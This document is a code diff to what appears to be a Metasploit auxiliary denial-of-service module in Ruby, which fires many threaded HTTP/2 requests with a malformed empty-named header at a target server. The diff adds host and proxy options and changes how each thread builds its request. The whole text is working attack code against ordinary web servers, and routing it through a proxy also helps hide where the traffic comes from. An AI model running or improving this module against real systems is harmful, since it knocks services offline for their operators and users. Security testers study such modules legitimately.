@@ -4,9 +4,9 @@
 ##
 
 require 'net-http2'
+require 'uri'
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
@@ -24,11 +24,11 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
+        OptString.new('HOST', [true, 'The hostname', '']),
+        OptString.new('PROXY', [false, 'Proxy url', '']),
         OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
         OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
-        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
-        OptBool.new('SSL', [true, 'Use SSL', true]),
-        Opt::RPORT(443)
+        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 15])
       ]
     )
   end
@@ -46,12 +46,20 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def hostname
-    datastore['VHOST']
+    datastore['HOST']
+  end
+
+  def opts
+    if !datastore['PROXY'].empty?
+      uri = URI.parse(datastore['PROXY'])
+      return {
+        proxy_addr: "#{uri.scheme}://#{uri.host}",
+        proxy_port: uri.port.to_s
+      }
+    end
   end
 
   def run
-    headers = { '' => Rex::Text.rand_text_english(rand(1..42)) }
-
     starting_thread = 1
     while starting_thread < rlimit
       ubound = [rlimit - (starting_thread - 1), thread_count].min
@@ -60,15 +68,20 @@ class MetasploitModule < Msf::Auxiliary
       threads = []
       1.upto(ubound) do |i|
         threads << framework.threads.spawn("Module(#{refname})-request#{(starting_thread - 1) + i}", false, i) do |_i|
-          client = NetHttp2::Client.new("https://#{hostname}")
+          headers = { '' => Rex::Text.rand_text_english(rand(1..42)) }
+          options = opts.nil? ? nil : opts
+
+          client = nil
+          if !opts.nil?
+            client = NetHttp2::Client.new("https://#{hostname}", options = opts)
+          else
+            client = NetHttp2::Client.new("https://#{hostname}")
+          end
+
           request = client.prepare_request(:get, '/', headers: headers, timeout: timeout)
 
           client.on(:error) do |err|
             print_error("Exception has been raised: #{err}")
-          end
-
-          request.on(:close) do
-            print_good('Finished request!')
           end
 
           client.call_async(request)
